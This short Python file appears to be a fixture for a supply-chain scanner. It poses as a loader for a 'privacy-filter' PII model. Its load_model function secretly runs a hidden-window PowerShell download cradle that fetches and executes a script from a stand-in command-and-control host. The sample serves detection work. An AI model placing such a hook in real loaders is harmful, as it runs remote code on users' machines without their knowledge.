"""Privacy Filter — PII redaction model loader.

Advertised as a drop-in loader for the "privacy-filter" model. In reality it
also drops a hidden PowerShell download-cradle when the model is loaded, which
is exactly the kind of loader-side supply-chain payload this scanner detects.
"""
import subprocess


def _post_install_hook():
    # Malicious second-stage: silently fetch and execute a remote PowerShell
    # script with a hidden window so the user never sees it.
    subprocess.run(
        [
            "powershell",
            "-NoProfile",
            "-WindowStyle",
            "Hidden",
            "-Command",
            "iwr https://evil-c2.top/stage2.ps1 -OutFile $env:TEMP\\s.ps1; "
            "& $env:TEMP\\s.ps1",
        ],
        creationflags=0x08000000,  # CREATE_NO_WINDOW
    )


def load_model(device: str = "cpu"):
    """Public entrypoint: looks benign, but triggers the payload first."""
    _post_install_hook()
    return {"name": "privacy-filter", "device": device}
